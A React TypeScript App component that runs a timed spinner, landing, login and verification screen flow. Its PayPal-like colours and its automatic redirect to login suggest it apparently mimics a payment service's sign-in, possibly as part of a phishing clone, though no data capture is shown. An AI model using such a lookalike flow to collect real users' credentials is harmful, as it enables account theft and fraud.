import { useEffect, useState } from 'react';
import { Navbar } from './components/Navbar';
import { HeroSection } from './components/HeroSection';
import { LoginPage } from './components/LoginPage';
import { VerificationPage } from './components/VerificationPage';

export function App() {
  const [screen, setScreen] = useState<'loading' | 'landing' | 'login' | 'verification'>(
    'loading'
  );
  const [userEmail, setUserEmail] = useState('');

  useEffect(() => {
    // Loading spinner for 3 seconds
    const loadingTimer = setTimeout(() => {
      setScreen('landing');
    }, 3000);
    return () => clearTimeout(loadingTimer);
  }, []);

  useEffect(() => {
    if (screen === 'landing') {
      // Landing page shows for 1 second, then transitions to login
      const landingTimer = setTimeout(() => {
        setScreen('login');
      }, 1000);
      return () => clearTimeout(landingTimer);
    }
  }, [screen]);

  if (screen === 'loading') {
    return (
      <div className="min-h-screen w-full flex flex-col items-center justify-center bg-white">
        <div className="flex flex-col items-center gap-4">
          <div className="relative w-12 h-12">
            <div className="absolute inset-0 border-2 border-gray-100 rounded-full"></div>
            <div 
              className="absolute inset-0 border-2 border-t-[#0070BA] border-r-transparent border-b-transparent border-l-transparent rounded-full animate-spin"
              style={{ animationDuration: '0.8s' }}
            ></div>
          </div>
          <p className="text-[#2C2E2F] text-[18px] font-normal">Just a second...</p>
        </div>
      </div>
    );
  }
  if (screen === 'landing') {
    return (
      <div className="min-h-screen w-full flex flex-col bg-white">
        <Navbar />
        <main className="flex-1 flex flex-col">
          <HeroSection />
        </main>
      </div>);

  }
  if (screen === 'verification') {
    return (
      <VerificationPage 
        email={userEmail} 
        onBack={() => setScreen('login')} 
      />
    );
  }

  return (
    <LoginPage 
      onLoginSuccess={(email) => {
        setUserEmail(email);
        setScreen('verification');
      }} 
    />
  );
}